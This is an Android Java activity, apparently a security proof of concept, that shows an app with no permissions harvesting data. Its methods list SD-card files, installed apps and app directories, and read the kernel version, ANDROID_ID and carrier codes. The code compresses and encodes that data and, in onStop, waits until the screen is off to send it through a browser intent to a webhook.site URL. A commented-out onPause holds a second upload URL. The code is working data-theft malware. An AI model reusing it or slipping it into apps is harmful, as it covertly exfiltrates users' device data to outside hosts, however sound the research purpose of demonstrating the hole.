package boku.no.nopermission;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.hardware.display.DisplayManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.view.Display;
import android.view.View;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import java.io.*;
import java.util.zip.GZIPOutputStream;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;


public class NoPermissionsActivity extends Activity {

    private static final String TAG = "NoPermissionsActivity";
    private static final String STATE_DATA_TO_UPLOAD = "STATE_DATA_TO_UPLOAD";

    Random rand;
    ArrayList<String> dataToUpload = new ArrayList<>();

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        rand = new Random(System.currentTimeMillis());

        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        BroadcastReceiver mReceiver = new ScreenReceiver();
        registerReceiver(mReceiver, filter);
    }

    public void buttonHandler(View view) {
        switch (view.getId()) {
            case R.id.steal_sd_button:
                stealSD();
                break;
            case R.id.steal_app_data_button:
                stealAppData();
                break;
            case R.id.upload_data_button:
                String version = readVersion();
                String id = readIdentifiers();
                exfiltrate(version, id);
                break;
        }
    }

    private void exfiltrate(String version, String id) {
        String send = "ver=" + version + "?" + id;
        sendByBrowser(send);
    }

    private String readIdentifiers() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String op = "0", sim = "0";
        if (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
            op = tm.getNetworkOperator();
            Log.i(TAG, "readIdentifiers - GSM Operator: " + op);
        } else {
            Log.i(TAG, "readIdentifiers - not GSM");
        }
        if (tm.getSimState() == TelephonyManager.SIM_STATE_READY) {
            sim = tm.getSimOperator();
            Log.i(TAG, "readIdentifiers - SIM Operator: " + sim);
        } else {
            Log.i(TAG, "readIdentifiers - SIM Not Ready");
        }
        @SuppressLint("HardwareIds") String androidID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        return "gsm=" + op + "&sim=" + sim + "&aid=" + androidID;
    }

    private String readVersion() {
        BufferedReader procversion;
        try {
            procversion = new BufferedReader(new FileReader("/proc/version"));
        } catch (FileNotFoundException e) {
            return "";
        }
        String kernel;
        try {
            kernel = procversion.readLine();
        } catch (IOException e) {
            return "";
        }
        return URLEncoder.encode(kernel);
    }

    private void stealAppDataNew() {
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        StringBuilder send = new StringBuilder();
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                send.append("|").append(appName);
                Log.i(TAG, "stealAppData - installed app: " + i + " as uid " + appName);
            }
        }
        sendGzByBrowser(send.toString(), "apps");
    }

    private void stealAppData() {
        BufferedReader applist;
        try {
            applist = new BufferedReader(new FileReader("/data/system/packages.list"));
        } catch (FileNotFoundException e) {
            Log.d(TAG, "No permission for reading list of packages: using package manager instead.");
            stealAppDataNew();
            return;
        }
        String appentry;
        List<String> apps = new ArrayList<>();
        try {
            while ((appentry = applist.readLine()) != null) {
                String[] tokens = appentry.split(" ");
                Log.i(TAG, "stealAppData - installed app: " + tokens[0] + " as uid " + tokens[1]);
                apps.add(tokens[0]);
                File appdir = new File(tokens[3]);
                apps.addAll(recurse(appdir, true));
            }
        } catch (IOException ignored) {
        } finally {
            StringBuilder send = new StringBuilder();
            for (String entry : apps)
                send.append("|").append(entry);
            sendGzByBrowser(send.toString(), "apps");
        }
        try {
            applist.close();
        } catch (IOException ignored) {
        }

    }

    private List<String> recurse(File dir) {
        List<String> subdir = new ArrayList<>();
        if (dir.isDirectory() && dir.canRead()) {
            File[] dirlist = dir.listFiles();
            for (File entry : dirlist) {
                if (entry.isDirectory()) subdir.addAll(recurse(entry));
                else {
                    subdir.add(entry.getAbsolutePath());
                }
            }
            return subdir;
        }
        return subdir;
    }

    @SuppressWarnings("SameParameterValue")
    private List<String> recurse(File dir, Boolean appdir) {
        List<String> subdir = new ArrayList<>();
        if (dir.isDirectory() && dir.canRead()) {
            File[] dirlist = dir.listFiles();
            for (File entry : dirlist) {
                if (entry.isDirectory()) subdir.addAll(recurse(entry));
                else {
                    Log.i(TAG, "recurse - found file: " + entry.getAbsolutePath());
                    subdir.add(entry.getAbsolutePath());
                }
            }
            return subdir;
        } else if (appdir) {
            try {
                //Let's guess that we've got a base directory
                String[] guesses = {"lib", "cache", "files", "databases", "shared_prefs"};
                for (String guess : guesses) {
                    File check = new File(dir, guess);
                    if (check.exists()) subdir.addAll(recurse(check));
                }
            } catch (Exception e) {
                return subdir;
            }
        }
        return subdir;
    }

    private void stealSD() {
        @SuppressLint("SdCardPath") File sddir = new File("/sdcard");
        if (sddir.isDirectory() && sddir.canRead()) {
            List<String> listing = recurse(sddir);
            if (listing != null && listing.size() > 0) {
                StringBuilder send = new StringBuilder();
                for (String entry : listing)
                    send.append("|").append(entry);
                sendGzByBrowser(send.toString(), "sd");
            }
        } else {
            Toast.makeText(this, "The SD card couldn't be read.", Toast.LENGTH_SHORT).show();
        }
    }

    private void sendGzByBrowser(String string, String prefix) {
        Log.i(TAG, "sendGzByBrowser::" + string);
        byte[] bytes_in = string.getBytes();
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        GZIPOutputStream zos;
        try {
            zos = new GZIPOutputStream(new BufferedOutputStream(os));
            zos.write(bytes_in);
            zos.flush();
            zos.close();
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
        String data = Base64.encodeToString(
            os.toByteArray(),
            Base64.URL_SAFE | Base64.NO_WRAP | Base64.NO_PADDING
        );
        if (data.length() >= 500) {
            sendChunked(data, prefix);
        } else {
            sendByBrowser(prefix + "=" + data);
        }
    }

    public void sendByBrowser(String string) {
        dataToUpload.add(string);
        Toast.makeText(
            this,
            "Data was queued for upload.",
            Toast.LENGTH_SHORT
        ).show();
    }

    private void sendChunked(String string, String prefix) {
        int i = 0;
        final int SIZE = 500;
        final int pkt = rand.nextInt(10000) + 1;
        Handler handler = new Handler();
        String data;
        while (string.length() > 0) {
            if (string.length() >= SIZE) {
                data = string.substring(0, SIZE);
                string = string.substring(SIZE);
            } else {
                data = string;
                string = "";
            }
            handler.postDelayed(new RunBrowser(this, "type=" + prefix + "&packet=" + pkt + "&chunk=" + i + "&data=" + data), i * 5000);
            i++;
        }
    }

    private boolean isScreenOn() {
        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            DisplayManager dm = (DisplayManager) getSystemService(Context.DISPLAY_SERVICE);
            boolean screenOn = false;
            for (Display display : dm.getDisplays()) {
                if (display.getState() != Display.STATE_OFF) {
                    screenOn = true;
                }
            }
            return screenOn;
        } else {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            return pm.isScreenOn();
        }
    }

    //------ overridden lifecycle methods ------

//    @Override
//    protected void onPause() {
//        if (!isScreenOn()) {
//            StringBuilder sb = new StringBuilder("http://leviathansecurity.com/?noperms&");
//            for (String queuedString : dataToUpload) {
//                sb.append(queuedString).append('&');
//            }
//            dataToUpload.clear();
//            String request = sb.toString();
//            Log.d(TAG, "Uploading: " + request);
//            Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(request));
//            startActivity(myIntent);
//        }
//        if (ScreenReceiver.screenActive) {
//            // THIS IS THE CASE WHEN ONPAUSE() IS CALLED BY THE SYSTEM DUE TO A SCREEN STATE CHANGE
//            Log.d(TAG, "screen on");
//        } else {
//            Log.d(TAG, "screen off");
//
//        }
//        super.onPause();
//    }

    @Override
    protected void onStop() {
        super.onStop();
        if (!dataToUpload.isEmpty()) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            boolean isScreenOn;
            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                isScreenOn = pm.isInteractive();
            } else {
                isScreenOn = pm.isScreenOn();// deprecated after API 21
            }
            if (!isScreenOn) {
                Log.d(TAG, "The screen is off: uploading data...");
                StringBuilder sb = new StringBuilder("https://webhook.site/5ebd6968-4d2b-4c72-84a4-c3f491311c3e/?noperms&");
                for (String queuedString : dataToUpload) {
                    sb.append(queuedString).append('&');
                }
                dataToUpload.clear();
                String request = sb.toString();
                Log.d(TAG, "Uploading: " + request);
                Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(request));
                startActivity(myIntent);
            }
        }
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        ArrayList<String> restoredData = savedInstanceState.getStringArrayList(STATE_DATA_TO_UPLOAD);
        if (restoredData != null) {
            dataToUpload.addAll(restoredData);
            Log.d(TAG, "Data to upload restored.");
        } else {
            Log.d(TAG, "Error retrieving data to upload.");
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        if (!dataToUpload.isEmpty()) {
            outState.putStringArrayList(STATE_DATA_TO_UPLOAD, dataToUpload);
            Log.d(TAG, "Data to upload saved.");
        }
    }
}